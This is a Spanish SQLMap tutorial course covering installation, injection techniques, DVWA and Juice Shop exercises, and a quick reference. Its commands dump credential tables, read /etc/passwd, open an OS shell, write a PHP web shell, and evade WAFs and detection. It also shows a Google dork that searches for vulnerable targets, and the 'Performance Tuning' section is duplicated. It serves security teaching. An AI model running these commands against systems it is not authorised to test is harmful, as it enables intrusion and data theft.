@@ -1,0 +1,820 @@
+---
+title: "Minicurso: SQLMap"
+module: "minicurso-sqlmap"
+type: "minicurso"
+description: "Tutorial completo de SQLMap para testing de inyección SQL en ciberseguridad"
+---
+
+
+## ¿Qué es SQLMap?
+
+SQLMap es la herramienta de automatización de detección y explotación de inyección SQL de código abierto más poderosa del mundo. Desarrollada por Bernardo Damele y Miroslav Stampar, SQLMap automatiza completamente el proceso de detectar y explotar vulnerabilidades de SQL injection, y tomar control del servidor de base de datos.
+
+SQLMap soporta todos los tipos principales de SQL injection: boolean-based blind, time-based blind, error-based, UNION query-based, y stacked queries. Soporta más de 10 tipos de bases de datos incluyendo MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, IBM DB2, y más. Una vez que detecta una vulnerabilidad, puede enumerar bases de datos, tablas, columnas, volcar datos, leer/escribir archivos del sistema operativo, y ejecutar comandos del SO.
+
+En ciberseguridad, SQLMap es la herramienta estándar para validar vulnerabilidades de SQL injection encontradas durante el testing manual o con scanners. Permite demostrar el impacto real de una inyección SQL (desde lectura de datos hasta ejecución remota de comandos) y es esencial en cualquier evaluación de seguridad de aplicaciones web. SQL injection consistently ranks #1 en OWASP Top 10 y es una de las vulnerabilidades más críticas.
+
+## ¿Por qué aprenderlo?
+
+- **Automatización completa**: Detecta y explota SQLi sin intervención manual
+- **10+ DBMS**: MySQL, PostgreSQL, Oracle, MSSQL, SQLite, DB2, y más
+- **5 tipos de inyección**: Boolean, time, error, UNION, stacked queries
+- **Post-explotación**: Enumerar DB, volcar datos, ejecutar comandos OS
+- **Estándar de la industria**: Herramienta #1 en SQL injection testing
+
+## Instalación
+
+### macOS
+
+```bash
+# Con Homebrew
+brew install sqlmap
+
+# Verificar instalación
+sqlmap --version
+# Esperado:
+# SQLMap version 1.8.x#stable
+
+# O instalar desde GitHub (versión más reciente)
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python3 sqlmap.py --version
+```
+
+### Linux (Ubuntu/Debian)
+
+```bash
+# Instalar desde repositorios
+sudo apt update
+sudo apt install -y sqlmap
+
+# Verificar
+sqlmap --version
+# Esperado: SQLMap version 1.8.x
+
+# O instalar desde GitHub (recomendado, más actualizado)
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python3 sqlmap.py --version
+
+# Actualizar
+sqlmap --update
+# o
+cd sqlmap && git pull
+```
+
+### Windows
+
+```powershell
+# Descargar desde https://github.com/sqlmapproject/sqlmap
+# O con git:
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+
+# Ejecutar con Python
+python sqlmap.py --version
+
+# O descargar ZIP desde GitHub releases
+# Extraer y ejecutar:
+python sqlmap.py --version
+```
+
+::: {.callout-warning}
+## Aviso Legal y Ético
+SQLMap es una herramienta de explotación de inyección SQL. Ejecutar SQLMap contra aplicaciones web sin autorización es ILEGAL. La inyección SQL puede permitir acceso completo a bases de datos, incluyendo datos personales, credenciales, y información financiera. Solo usa SQLMap en aplicaciones propias, laboratorios de práctica, o evaluaciones con autorización explícita por escrito. El uso indebido puede resultar en cargos criminales graves bajo leyes como la CFAA (EE.UU.) o equivalentes internacionales.
+:::
+
+## Nivel Básico
+
+### Conceptos Fundamentales
+
+**SQL Injection (SQLi)**: Vulnerabilidad que permite inyectar código SQL malicioso en consultas de base de datos a través de inputs no sanitizados.
+
+**Boolean-based blind**: La inyección se detecta por diferencias en la respuesta (true/false). No muestra datos directamente.
+
+**Time-based blind**: La inyección se detecta por delays en la respuesta. La DB ejecuta SLEEP() o WAITFOR DELAY.
+
+**Error-based**: La inyección causa errores de SQL que revelan información de la base de datos.
+
+**UNION query**: La inyección permite agregar una consulta UNION que devuelve datos adicionales.
+
+**Stacked queries**: La inyección permite ejecutar múltiples consultas separadas por punto y coma.
+
+### Comandos Esenciales
+
+| Comando | Descripción | Ejemplo |
+|---------|-------------|---------|
+| `sqlmap -u <url>` | Test URL básica | `sqlmap -u "http://target/page?id=1"` |
+| `-u` | URL objetivo | `sqlmap -u "http://target/page?id=1"` |
+| `--dbs` | Enumerar bases de datos | `sqlmap -u "url" --dbs` |
+| `--tables` | Enumerar tablas | `sqlmap -u "url" -D db --tables` |
+| `--columns` | Enumerar columnas | `sqlmap -u "url" -D db -T table --columns` |
+| `--dump` | Volcar datos | `sqlmap -u "url" -D db -T table --dump` |
+| `--os-shell` | Shell del SO | `sqlmap -u "url" --os-shell` |
+| `--batch` | Modo no interactivo | `sqlmap -u "url" --batch` |
+| `--level <1-5>` | Nivel de test | `sqlmap -u "url" --level 3` |
+| `--risk <1-3>` | Riesgo de test | `sqlmap -u "url" --risk 2` |
+| `-p <param>` | Test parámetro específico | `sqlmap -u "url" -p id` |
+| `--technique` | Tipo de inyección | `sqlmap -u "url" --technique=BEUSTQ` |
+| `--dbms` | Especificar DBMS | `sqlmap -u "url" --dbms=mysql` |
+| `--tamper` | Usar tamper scripts | `sqlmap -u "url" --tamper=space2comment` |
+| `--threads` | Hilos paralelos | `sqlmap -u "url" --threads 10` |
+
+### Testing Básico de URL
+
+```bash
+# Test básico de un parámetro GET
+sqlmap -u "http://192.168.1.100/vulnerabilities/sqli/?id=1&Submit=Submit"
+# Esperado:
+# [INFO] testing connection to the target URL
+# [INFO] testing if the target URL content is stable
+# [INFO] target URL content is stable
+# [INFO] testing if GET parameter 'id' is dynamic
+# [INFO] GET parameter 'id' appears to be dynamic
+# [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+# ...
+# [INFO] GET parameter 'id' is 'AND boolean-based blind' injectable
+# [INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable
+
+# Test con batch (sin preguntas interactivas)
+sqlmap -u "http://192.168.1.100/vulnerabilities/sqli/?id=1" --batch
+
+# Test con nivel y riesgo
+sqlmap -u "http://192.168.1.100/vulnerabilities/sqli/?id=1" --level 3 --risk 2
+# --level 1-5: más alto = más pruebas (default 1)
+# --risk 1-3: más alto = más intrusivo (default 1)
+```
+
+::: {.callout-tip}
+## Level y Risk
+| Level | Qué testea |
+|-------|-----------|
+| 1 (default) | GET, POST, Cookie |
+| 2 | + HTTP Host, User-Agent |
+| 3 | + HTTP Referer |
+| 4 | + más payloads |
+| 5 | + más headers |
+
+| Risk | Qué hace |
+|------|----------|
+| 1 (default) | Tests seguros |
+| 2 | + UPDATE queries |
+| 3 | + INSERT queries (puede modificar datos) |
+:::
+
+### Enumeración de Base de Datos
+
+```bash
+# Enumerar todas las bases de datos
+sqlmap -u "http://192.168.1.100/vulnerabilities/sqli/?id=1" --dbs --batch
+# Esperado:
+# available databases [2]:
+# [*] dvwa
+# [*] information_schema
+
+# Enumerar tablas de una base de datos
+sqlmap -u "http://192.168.1.100/vulnerabilities/sqli/?id=1" \
+    -D dvwa --tables --batch
+# Esperado:
+# Database: dvwa
+# [2 tables]
+# +-----------+
+# | guestbook |
+# | users     |
+# +-----------+
+
+# Enumerar columnas de una tabla
+sqlmap -u "http://192.168.1.100/vulnerabilities/sqli/?id=1" \
+    -D dvwa -T users --columns --batch
+# Esperado:
+# Database: dvwa
+# Table: users
+# [8 columns]
+# +------------+-------------+
+# | Column     | Type        |
+# +------------+-------------+
+# | user_id    | int(6)      |
+# | first_name | varchar(15) |
+# | last_name  | varchar(15) |
+# | user       | varchar(15) |
+# | password   | varchar(32) |
+# | avatar     | varchar(200)|
+# +------------+-------------+
+
+# Volcar datos de una tabla
+sqlmap -u "http://192.168.1.100/vulnerabilities/sqli/?id=1" \
+    -D dvwa -T users --dump --batch
+# Esperado:
+# Database: dvwa
+# Table: users
+# [5 entries]
+# +---------+------------+-----------+---------+----------------------------------+
+# | user_id | first_name | last_name | user    | password                         |
+# +---------+------------+-----------+---------+----------------------------------+
+# | 1       | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
+# | 2       | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 |
+# +---------+------------+-----------+---------+----------------------------------+
+```
+
+### Testing de POST Requests
+
+```bash
+# Test de formulario POST
+sqlmap -u "http://192.168.1.100/vulnerabilities/sqli/" \
+    --data="id=1&Submit=Submit" --batch
+
+# Con archivo de request (desde Burp Suite)
+# En Burp: Right-click > Copy to file > request.txt
+sqlmap -r request.txt --batch
+
+# Con archivo de request y parámetro específico
+sqlmap -r request.txt -p "username" --batch
+```
+
+### Ejercicio 1: Explotar SQLi en DVWA
+
+**Objetivo:** Detectar y explotar una vulnerabilidad de SQL injection en DVWA.
+
+**Paso 1:** Configurar entorno
+
+```bash
+# Iniciar DVWA con Docker
+docker run --rm -it -p 8080:80 vulnerables/web-dvwa
+
+# Acceder: http://localhost:8080
+# Login: admin / password
+# DVWA Security: Low
+# Ir a: SQL Injection
+```
+
+**Paso 2:** Detectar vulnerabilidad
+
+```bash
+# Test básico
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=$(curl -s -c - http://localhost:8080/login.php | grep PHPSESSID | awk '{print $NF}')" \
+    --batch
+
+# Si detecta inyección, continuar con enumeración
+```
+
+**Paso 3:** Enumerar y volcar datos
+
+```bash
+# Enumerar bases de datos
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=abc123" \
+    --dbs --batch
+
+# Enumerar tablas
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=abc123" \
+    -D dvwa --tables --batch
+
+# Volcar tabla users
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=abc123" \
+    -D dvwa -T users --dump --batch
+```
+
+## Nivel Intermedio
+
+### Técnicas de Inyección Específicas
+
+```bash
+# Especificar técnica de inyección
+# B = Boolean-based blind
+# E = Error-based
+# U = UNION query-based
+# S = Stacked queries
+# T = Time-based blind
+# Q = Inline queries
+
+# Solo boolean-based
+sqlmap -u "http://target/page?id=1" --technique=B --batch
+
+# Solo time-based
+sqlmap -u "http://target/page?id=1" --technique=T --batch
+
+# UNION query
+sqlmap -u "http://target/page?id=1" --technique=U --batch
+
+# Múltiples técnicas
+sqlmap -u "http://target/page?id=1" --technique=BEUST --batch
+
+# Especificar DBMS conocido
+sqlmap -u "http://target/page?id=1" --dbms=mysql --batch
+sqlmap -u "http://target/page?id=1" --dbms=postgresql --batch
+sqlmap -u "http://target/page?id=1" --dbms=mssql --batch
+sqlmap -u "http://target/page?id=1" --dbms=oracle --batch
+```
+
+### OS Shell y File Access
+
+```bash
+# Obtener shell del sistema operativo
+sqlmap -u "http://target/page?id=1" --os-shell --batch
+# Esperado:
+# [INFO] going to use a web backdoor for command prompt
+# [INFO] fingerprinting the back-end DBMS
+# ...
+# os-shell> whoami
+# os-shell> id
+# os-shell> cat /etc/passwd
+
+# Leer archivos del sistema
+sqlmap -u "http://target/page?id=1" \
+    --file-read="/etc/passwd" --batch
+
+# Escribir archivos en el servidor
+sqlmap -u "http://target/page?id=1" \
+    --file-write="/tmp/shell.php" \
+    --file-dest="/var/www/html/shell.php" --batch
+
+# Ejecutar comandos SQL directamente
+sqlmap -u "http://target/page?id=1" \
+    --sql-query="SELECT version()" --batch
+
+# Ejecutar comandos del SO
+sqlmap -u "http://target/page?id=1" \
+    --os-cmd="id" --batch
+```
+
+::: {.callout-warning}
+## --os-shell requiere privilegios
+El comando --os-shell requiere que el usuario de la base de datos tenga privilegios FILE (MySQL) o equivalentes. No funciona en todas las configuraciones. En entornos reales, estos privilegios deberían estar restringidos.
+:::
+
+### Second-Order Injection
+
+```bash
+# Second-order SQLi: la inyección se almacena y se ejecuta después
+
+# Paso 1: Inyectar payload en un campo que se almacena
+sqlmap -u "http://target/register" \
+    --data="username=admin'&email=test@test.com&password=test" \
+    --batch
+
+# Paso 2: Trigger en otra página donde se usa el valor almacenado
+sqlmap -u "http://target/profile" \
+    --data="username=admin" \
+    --second-order="http://target/profile" \
+    --batch
+```
+
+### API Testing
+
+```bash
+# Testing de APIs REST con JSON body
+sqlmap -u "http://target/api/users" \
+    --data='{"id": "1"}' \
+    --headers="Content-Type: application/json" \
+    --batch
+
+# Testing con header injection
+sqlmap -u "http://target/api/users" \
+    --headers="X-Forwarded-For: 1'*" \
+    --batch
+
+# Testing con XML body
+sqlmap -u "http://target/api/users" \
+    --data='<id>1</id>' \
+    --headers="Content-Type: application/xml" \
+    --batch
+```
+
+### Custom Injection Points
+
+```bash
+# Inyección en headers
+sqlmap -u "http://target/page" \
+    --headers="User-Agent: sqlmap" \
+    --level 5 --batch
+# Level 5 testa User-Agent y Referer
+
+# Inyección en cookies
+sqlmap -u "http://target/page" \
+    --cookie="id=1*" \
+    --batch
+# El * marca el punto de inyección
+
+# Inyección en múltiples parámetros
+sqlmap -u "http://target/page?id=1&name=test" \
+    -p "id,name" --batch
+
+# Inyección en URL path
+sqlmap -u "http://target/page/1*" --batch
+```
+
+### Ejercicio 2: Enumeración completa de base de datos
+
+**Objetivo:** Enumerar completamente una base de datos vulnerable.
+
+**Paso 1:** Identificar DBMS y versión
+
+```bash
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=abc123" \
+    --batch --banner
+# Esperado:
+# back-end DBMS: MySQL 5.7
+# banner: '5.7.34-0ubuntu0.18.04.1'
+```
+
+**Paso 2:** Enumerar usuarios y privilegios
+
+```bash
+# Usuarios de la base de datos
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=abc123" \
+    --users --batch
+
+# Hashes de contraseñas
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=abc123" \
+    --passwords --batch
+
+# Privilegios del usuario actual
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=abc123" \
+    --privileges --batch
+
+# Roles del usuario actual
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=abc123" \
+    --roles --batch
+```
+
+**Paso 3:** Volcar datos sensibles
+
+```bash
+# Volcar todas las tablas
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=abc123" \
+    -D dvwa --dump-all --batch
+
+# Los datos se guardan en:
+# ~/.local/share/sqlmap/output/target/dump/
+ls ~/.local/share/sqlmap/output/localhost/dump/
+
+# Ver datos volcados
+cat ~/.local/share/sqlmap/output/localhost/dump/dvwa/users.csv
+```
+
+**Paso 4:** Limpiar evidencia de testing
+
+```bash
+# SQLMap guarda sesiones y logs
+# Ver sesiones guardadas
+ls ~/.local/share/sqlmap/output/
+
+# Limpiar output después de práctica
+rm -rf ~/.local/share/sqlmap/output/localhost/
+```
+
+## Nivel Avanzado
+
+### Tamper Scripts
+
+```bash
+# Tamper scripts modifican los payloads para evadir WAFs y filtros
+
+# Ver todos los tamper scripts disponibles
+sqlmap --list-tampers
+
+# Tamper scripts comunes:
+sqlmap -u "http://target/page?id=1" --tamper=space2comment --batch
+# Reemplaza espacios con /**/
+
+sqlmap -u "http://target/page?id=1" --tamper=charencode --batch
+# URL-encodea todos los caracteres
+
+sqlmap -u "http://target/page?id=1" --tamper=base64encode --batch
+# Encodea payload en base64
+
+sqlmap -u "http://target/page?id=1" --tamper=randomcase --batch
+# Alterna mayúsculas/minúsculas
+
+sqlmap -u "http://target/page?id=1" --tamper=apostrophemask --batch
+# Reemplaza ' con UTF-8 fullwidth
+
+sqlmap -u "http://target/page?id=1" --tamper=equaltolike --batch
+# Reemplaza = con LIKE
+
+sqlmap -u "http://target/page?id=1" --tamper=space2dash --batch
+# Reemplaza espacio con -- y random string
+
+# Múltiples tampers
+sqlmap -u "http://target/page?id=1" \
+    --tamper=space2comment,randomcase,charencode --batch
+```
+
+### Risk y Level Tuning
+
+```bash
+# Level alto: testa más parámetros y payloads
+sqlmap -u "http://target/page?id=1" --level 5 --batch
+# Testa: GET, POST, Cookie, User-Agent, Referer
+
+# Risk alto: usa payloads más intrusivos
+sqlmap -u "http://target/page?id=1" --risk 3 --batch
+# Risk 3 incluye UPDATE e INSERT queries
+
+# Combinación agresiva
+sqlmap -u "http://target/page?id=1" --level 5 --risk 3 --batch
+
+# Para producción (mínimo impacto)
+sqlmap -u "http://target/page?id=1" --level 1 --risk 1 --batch
+```
+
+### Performance Tuning
+
+```bash
+# Threads paralelos (acelera time-based blind)
+sqlmap -u "http://target/page?id=1" --threads 10 --batch
+# Default: 1, máximo recomendado: 10
+
+# Delay entre requests (evitar detección)
+sqlmap -u "http://target/page?id=1" --delay 2 --batch
+# 2 segundos entre cada request
+
+# Timeout
+sqlmap -u "http://target/page?id=1" --timeout 30 --batch
+# 30 segundos de timeout por request
+
+# Retries
+sqlmap -u "http://target/page?id=1" --retries 3 --batch
+# 3 retries por request fallido
+
+# Random User-Agent
+sqlmap -u "http://target/page?id=1" --random-agent --batch
+
+# Proxy
+sqlmap -u "http://target/page?id=1" --proxy="http://127.0.0.1:8080" --batch
+# Usar con Burp Suite para interceptar
+```
+
+### Performance Tuning
+
+```bash
+# Threads paralelos (acelera time-based blind)
+sqlmap -u "http://target/page?id=1" --threads 10 --batch
+# Default: 1, máximo recomendado: 10
+
+# Delay entre requests (evitar detección)
+sqlmap -u "http://target/page?id=1" --delay 2 --batch
+# 2 segundos entre cada request
+
+# Timeout
+sqlmap -u "http://target/page?id=1" --timeout 30 --batch
+# 30 segundos de timeout por request
+
+# Retries
+sqlmap -u "http://target/page?id=1" --retries 3 --batch
+# 3 retries por request fallido
+
+# Random User-Agent
+sqlmap -u "http://target/page?id=1" --random-agent --batch
+
+# Proxy
+sqlmap -u "http://target/page?id=1" --proxy="http://127.0.0.1:8080" --batch
+# Usar con Burp Suite para interceptar
+
+# Tor proxy
+sqlmap -u "http://target/page?id=1" --tor --tor-type=SOCKS5 --batch
+
+# Google dork para encontrar targets
+sqlmap -g "inurl:\".php?id=\"" --batch
+# Busca en Google URLs vulnerables
+```
+
+### Session Management
+
+```bash
+# SQLMap guarda sesiones para reanudar
+# Las sesiones se guardan en:
+# ~/.local/share/sqlmap/output/target/session/
+
+# Reanudar sesión interrumpida
+sqlmap -u "http://target/page?id=1" --resume
+
+# Usar sesión guardada
+sqlmap -u "http://target/page?id=1" --session="/path/to/session"
+
+# Limpiar sesiones
+rm -rf ~/.local/share/sqlmap/output/target/
+
+# Configurar directorio de output
+sqlmap -u "http://target/page?id=1" --output-dir="/tmp/sqlmap-output"
+```
+
+### Ejercicio 3: Evasión de WAF con SQLMap
+
+**Objetivo:** Usar tamper scripts para evadir filtros básicos.
+
+**Paso 1:** Configurar WAF básico
+
+```bash
+# Usar aplicación con filtrado básico de SQL
+# (Juice Shop tiene protección básica)
+docker run -d -p 3000:3000 bkimminich/juice-shop
+```
+
+**Paso 2:** Test sin tamper (debería fallar o ser lento)
+
+```bash
+sqlmap -u "http://localhost:3000/api/Users/?offset=0&limit=3" \
+    --batch --level 3
+```
+
+**Paso 3:** Test con tamper scripts
+
+```bash
+# Probar diferentes tampers
+sqlmap -u "http://localhost:3000/api/Users/?offset=0&limit=3" \
+    --tamper=space2comment --batch --level 3
+
+sqlmap -u "http://localhost:3000/api/Users/?offset=0&limit=3" \
+    --tamper=randomcase --batch --level 3
+
+sqlmap -u "http://localhost:3000/api/Users/?offset=0&limit=3" \
+    --tamper=charencode --batch --level 3
+
+# Si uno funciona, continuar con enumeración
+sqlmap -u "http://localhost:3000/api/Users/?offset=0&limit=3" \
+    --tamper=space2comment --dbs --batch --level 3
+```
+
+## Uso en Ciberseguridad
+
+### Escenario 1: SQLi vulnerability validation
+
+```bash
+# Cuando se encuentra una posible SQLi manualmente
+
+# 1. Confirmar con SQLMap
+sqlmap -u "http://target/page?id=1" --batch
+
+# 2. Identificar tipo de inyección
+# [INFO] GET parameter 'id' is 'AND boolean-based blind' injectable
+
+# 3. Determinar impacto
+sqlmap -u "http://target/page?id=1" --dbs --batch
+# Si puede listar DBs, la inyección es confirmada
+
+# 4. Documentar en reporte
+# - Tipo de inyección
+# - DBMS y versión
+# - Datos accesibles
+# - Potencial de escalada (--os-shell)
+```
+
+### Escenario 2: Database security assessment
+
+```bash
+# Evaluación completa de seguridad de base de datos
+
+# 1. Enumerar todo
+sqlmap -u "http://target/page?id=1" --dbs --batch
+sqlmap -u "http://target/page?id=1" -D db --tables --batch
+sqlmap -u "http://target/page?id=1" -D db -T table --columns --batch
+
+# 2. Verificar privilegios
+sqlmap -u "http://target/page?id=1" --privileges --batch
+sqlmap -u "http://target/page?id=1" --is-dba --batch
+
+# 3. Verificar acceso a archivos
+sqlmap -u "http://target/page?id=1" --file-read="/etc/passwd" --batch
+
+# 4. Verificar ejecución de comandos
+sqlmap -u "http://target/page?id=1" --os-cmd="id" --batch
+
+# 5. Generar reporte de hallazgos
+# - Datos expuestos
+# - Privilegios excesivos
+# - Acceso a archivos del SO
+# - Ejecución de comandos remotos
+```
+
+### Escenario 3: Data breach simulation
+
+```bash
+# Simular impacto de una filtración de datos
+
+# 1. Identificar tablas con datos sensibles
+sqlmap -u "http://target/page?id=1" -D db --tables --batch
+
+# 2. Volcar datos de tablas sensibles
+sqlmap -u "http://target/page?id=1" \
+    -D db -T users --dump --batch
+sqlmap -u "http://target/page?id=1" \
+    -D db -T customers --dump --batch
+sqlmap -u "http://target/page?id=1" \
+    -D db -T credit_cards --dump --batch
+
+# 3. Calcular impacto
+# - Número de registros expuestos
+# - Tipos de datos (PII, financieros, credenciales)
+# - Cumplimiento regulatorio (GDPR, PCI-DSS, HIPAA)
+
+# 4. Documentar en reporte de impacto
+# - Datos comprometidos
+# - Número de afectados
+# - Regulaciones violadas
+# - Recomendaciones de remediación
+```
+
+## Referencia Rápida
+
+| Comando | Descripción | Ejemplo |
+|---------|-------------|---------|
+| `-u <url>` | URL objetivo | `sqlmap -u "http://target?id=1"` |
+| `-r <file>` | Request file | `sqlmap -r request.txt` |
+| `--data` | POST data | `sqlmap -u url --data="id=1"` |
+| `--dbs` | Enumerar DBs | `sqlmap -u url --dbs` |
+| `--tables` | Enumerar tablas | `sqlmap -u url -D db --tables` |
+| `--columns` | Enumerar columnas | `sqlmap -u url -D db -T t --columns` |
+| `--dump` | Volcar datos | `sqlmap -u url -D db -T t --dump` |
+| `--os-shell` | Shell del SO | `sqlmap -u url --os-shell` |
+| `--batch` | No interactivo | `sqlmap -u url --batch` |
+| `--level` | Nivel 1-5 | `sqlmap -u url --level 3` |
+| `--risk` | Riesgo 1-3 | `sqlmap -u url --risk 2` |
+| `--technique` | Tipo inyección | `sqlmap -u url --technique=BEUST` |
+| `--dbms` | Especificar DBMS | `sqlmap -u url --dbms=mysql` |
+| `--tamper` | Tamper scripts | `sqlmap -u url --tamper=space2comment` |
+| `--threads` | Hilos | `sqlmap -u url --threads 10` |
+| `--proxy` | Usar proxy | `sqlmap -u url --proxy=http://127.0.0.1:8080` |
+| `--cookie` | Cookies | `sqlmap -u url --cookie="session=abc"` |
+| `--file-read` | Leer archivo | `sqlmap -u url --file-read="/etc/passwd"` |
+| `--passwords` | Hashes de pass | `sqlmap -u url --passwords` |
+
+## Recursos Adicionales
+
+- **Documentación oficial**: https://sqlmap.org/
+- **GitHub**: https://github.com/sqlmapproject/sqlmap
+- **Wiki**: https://github.com/sqlmapproject/sqlmap/wiki
+- **Tamper scripts**: `sqlmap --list-tampers`
+- **Practice**: https://portswigger.net/web-security/sql-injection (Web Security Academy)
+- **DVWA**: https://github.com/digininja/DVWA
+- **SQLi Labs**: https://github.com/Audi-1/sqli-labs
+
+## Apéndice: Tamper Scripts Más Útiles
+
+### Evasión de Espacios
+| Tamper | Qué hace | Ejemplo |
+|--------|----------|---------|
+| `space2comment` | Espacio → `/**/` | `SELECT/**/1` |
+| `space2dash` | Espacio → `--\n` | `SELECT--\n1` |
+| `space2hash` | Espacio → `#\n` | `SELECT#\n1` |
+| `space2morehash` | Espacio → `#\n` + random | `SELECT#\n1` |
+| `space2mssqlblank` | Espacio → chars aleatorios | `SELECT\x011` |
+| `space2mssqlhash` | Espacio → `#\n` | `SELECT#\n1` |
+| `space2mysqlblank` | Espacio → chars aleatorios | `SELECT\x0b1` |
+| `space2mysqldash` | Espacio → `--\n` | `SELECT--\n1` |
+| `space2plus` | Espacio → `+` | `SELECT+1` |
+| `space2randomblank` | Espacio → char aleatorio | `SELECT\x0b1` |
+
+### Encoding
+| Tamper | Qué hace | Ejemplo |
+|--------|----------|---------|
+| `charencode` | URL-encodea caracteres | `%53%45%4C%45%43%54` |
+| `charunicodeencode` | Unicode URL-encode | `%u0053%u0045` |
+| `base64encode` | Base64 encode | `U0VMRUNU` |
+| `apostrophemask` | `'` → UTF-8 fullwidth | `＇` |
+| `equaltolike` | `=` → `LIKE` | `WHERE 1 LIKE 1` |
+| `randomcase` | Alterna case | `SeLeCt` |
+| `lowercase` | Todo minúsculas | `select` |
+| `uppercase` | Todo mayúsculas | `SELECT` |
+
+### WAF Bypass
+| Tamper | Qué hace | WAF objetivo |
+|--------|----------|-------------|
+| `modsecurityversioned` | Comentarios con versión | ModSecurity |
+| `modsecurityzeroversioned` | Comentarios `/*!00000*/` | ModSecurity |
+| `between` | `>` → `NOT BETWEEN 0 AND` | Varios |
+| `greatest` | `>` → `GREATEST()` | Varios |
+| `ifnull2ifisnull` | `IFNULL()` → `IF(ISNULL())` | MySQL WAFs |
+| `versionedkeywords` | Keywords con versión | MySQL WAFs |
+| `halfversionedmorekeywords` | Keywords con `/*!0` | MySQL WAFs |
+
+### Combinaciones Recomendadas
+```bash
+# WAF genérico
+--tamper=space2comment,randomcase
+
+# ModSecurity
+--tamper=modsecurityversioned,space2comment
+
+# Cloudflare
+--tamper=space2comment,charencode
+
+# AWS WAF
+--tamper=space2dash,randomcase
+
+# Imperva
+--tamper=space2comment,between,greatest
+```
+
+---
+
+*Minicurso SQLMap — Curso Fundamentos de Ciberseguridad — CC BY-SA 4.0*
